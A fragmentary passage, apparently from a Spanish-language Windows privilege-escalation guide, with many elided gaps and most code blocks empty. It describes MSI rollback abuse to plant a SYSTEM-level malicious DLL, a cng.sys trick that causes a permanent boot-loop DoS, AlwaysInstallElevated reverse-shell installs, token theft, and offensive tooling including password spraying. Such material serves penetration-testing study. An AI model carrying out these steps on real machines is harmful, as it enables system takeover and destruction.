- Paso 6: Recrear `C:\Config.Msi` con ACL débiles
- Recrear tú mismo la carpeta `C:\Config.Msi`.
- Establecer **DACL débiles** (por ejemplo, Everyone:F) y **mantener un handle abierto** con `WRITE_DAC`.

- Paso 7: Ejecutar otra instalación
- Instalar de nuevo el `.msi`, con:
- `TARGETDIR`: Ubicación con permisos de escritura.
- `ERROROUT`: Una variable que activa un fallo forzado.
- Esta instalación se utilizará para activar de nuevo el **rollback**, que lee `.rbs` y `.rbf`.

- Paso 8: Monitorizar los `.rbs`
...
- Paso 10: Volver a aplicar la ACL débil
- Después de recibir el evento de `.rbs creado`:
- Windows Installer **vuelve a aplicar ACL fuertes** a `C:\Config.Msi`.
- Pero, como todavía tienes un handle con `WRITE_DAC`, puedes **volver a aplicar ACL débiles**.

> Las **ACL solo se aplican al abrir el handle**, por lo que todavía puedes escribir en la carpeta.
...
- Soltar tu `.rbf` falso, que contiene una **DLL payload maliciosa a nivel SYSTEM**.

- Paso 12: Activar el rollback
- Señalar el evento de sincronización para que el instalador continúe.
- Una **acción personalizada de tipo 19 (`ErrorOut`)** está configurada para **hacer que la instalación falle intencionadamente** en un punto conocido.
- Esto provoca que comience el **rollback**.

- Paso 13: SYSTEM instala tu DLL
- Windows Installer:
- Lee tu `.rbs` malicioso.
- Copia la DLL `.rbf` al destino indicado.
...
### De la eliminación/movimiento/renombrado arbitrario de archivos a SYSTEM EoP

La técnica principal de rollback de MSI (la anterior) presupone que puedes eliminar una **carpeta completa** (por ejemplo, `C:\Config.Msi`). Pero ¿qué ocurre si tu vulnerabilidad solo permite la eliminación arbitraria de archivos?
...
Puedes hacerlo utilizando API estándar de eliminación de archivos como:
```c
...
¿Qué ocurre si tu primitive no te permite eliminar archivos/carpetas arbitrarios, pero **sí permite eliminar el *contenido* de una carpeta controlada por el atacante**?
...
- No elimines `file1.txt` directamente; hacerlo liberaría el oplock prematuramente.
...
```
- Opción C: Crear un **enlace simbólico** en `\RPC Control`:
```bash
...
### De la creación de una carpeta arbitraria a un DoS permanente

Explota una primitive que te permite **crear una carpeta arbitraria como SYSTEM/admin**, incluso si **no puedes escribir archivos** ni **establecer permisos débiles**.
...
- Si la **precreas como una carpeta**, Windows no puede cargar el controlador real durante el arranque.
- Entonces, Windows intenta cargar `cng.sys` durante el arranque.
- Detecta la carpeta, **no puede resolver el controlador real** y **se bloquea o detiene el arranque**.
- **No hay fallback** ni **recuperación** sin intervención externa (p. ej., reparación del arranque o acceso al disco).

### De rutas privilegiadas de logs/backups + symlinks de OM a sobrescritura arbitraria de archivos / DoS de arranque
...
**Requisitos**
- La configuración que almacena la ruta de destino puede ser modificada por el atacante (p. ej., `%ProgramData%\...\.ini`).
...
```
3. Espera a que el componente privilegiado escriba el log (por ejemplo, que un administrador active «send test SMS»). La escritura ahora se realiza en `C:\Windows\System32\cng.sys`.
4. Inspecciona el objetivo sobrescrito (con un parser hex/PE) para confirmar la corrupción; reiniciar fuerza a Windows a cargar la ruta del driver manipulado → **boot loop DoS**. Esto también se aplica a cualquier archivo protegido que un servicio privilegiado abra para escritura.

> `cng.sys` normalmente se carga desde `C:\Windows\System32\drivers\cng.sys`, pero si existe una copia en `C:\Windows\System32\cng.sys`, se puede intentar cargar primero, lo que lo convierte en un destino fiable para un DoS mediante datos corruptos.
...
Si ya estás ejecutando un proceso High Integrity, la **ruta hacia SYSTEM** puede ser sencilla: basta con **crear y ejecutar un nuevo servicio**:
```
...
Desde un proceso de Alta Integridad, puedes intentar **habilitar las entradas del registro AlwaysInstallElevated** e **instalar** un reverse shell usando un wrapper _**.msi**_.\
[Más información sobre las claves del registro implicadas y sobre cómo instalar un paquete _.msi_ aquí.](#alwaysinstallelevated)

### High + privilegio SeImpersonate a System

**Puedes** [**encontrar el código aquí**](seimpersonate-from-high-to-system.md)**.**

### De SeDebug + SeImpersonate a privilegios de Full Token

Si tienes esos privilegios del token (probablemente los encontrarás en un proceso de Alta Integridad), podrás **abrir casi cualquier proceso** (excepto procesos protegidos) con el privilegio SeDebug, **copiar el token** del proceso y crear un **proceso arbitrario con ese token**.\
Usando esta técnica, normalmente se **selecciona cualquier proceso que se ejecute como SYSTEM con todos los privilegios del token** (_sí, puedes encontrar procesos SYSTEM sin todos los privilegios del token_).\
...
Si quieres [**aprender más sobre los named pipes, deberías leer esto**](#named-pipe-client-impersonation).\
...
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Comprueba errores de configuración y archivos sensibles (**[**compruébalo aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Comprueba posibles errores de configuración y recopila información (**[**compruébalo aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Comprueba errores de configuración**\
...
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Realiza password spraying con las contraseñas recopiladas en el dominio**\
...
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera el host buscando errores de configuración (es más una herramienta de recopilación de información que de privesc) (debe compilarse) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
...
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Comprueba errores de configuración (ejecutable precompiled en GitHub). No recomendado. No funciona bien en Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Comprueba posibles errores de configuración (exe de Python). No recomendado. No funciona bien en Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Herramienta creada basándose en esta publicación (no necesita accesschk para funcionar correctamente, pero puede utilizarlo).
...
Debes compilar el proyecto usando la versión correcta de .NET ([consulta esto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver la versión instalada de .NET en el host víctima, puedes ejecutar:
```
...
- [2] [Escalada de privilegios mediante la explotación de permisos débiles en carpetas](http://www.greyhathacker.net/?p=738)
...
- [5] [DerbyCon 3.0 - Ataques de Windows: AT es el nuevo negro (Rob Fuller y Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
...
- [9] [Checklist de escalada de privilegios en Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
...
- [12] [0xdf – HTB/VulnLab JobTwo: phishing mediante macro VBA de Word vía SMTP → descifrado de credenciales de hMailServer → Veeam CVE-2023-27532 a SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak de format-string + stack BOF → VirtualAlloc ROP (RCE) y robo del token del kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
...
- [15] [Unit 42 – Vulnerabilidad del sistema de archivos con privilegios presente en un sistema SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
...
- [17] [Un enlace al pasado. Abusando de los enlaces simbólicos en Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
...
- [24] [Trail of Bits - desafíos de checklist de C/C++, resueltos](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
...
- [29] [Pwn2Own con Microslop: encadenando condiciones de carrera de CLDFLT y DirectX Kernel para LPE en Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Un I/O Ring para gobernarlos a todos: una primitiva de exploit completa de lectura/escritura en Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
...
- [36] [research.nccgroup.com - Delegación restringida basada en recursos de Kerberos: cuando un cambio de imagen conduce a una escalada de privilegios](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
...
- [38] [SpecterOps – Convirtiendo servidores de actualización empresariales en fábricas de backdoors (0_o) – Parte 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Convirtiendo servidores de actualización empresariales en fábricas de backdoors (0_o) – Parte 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
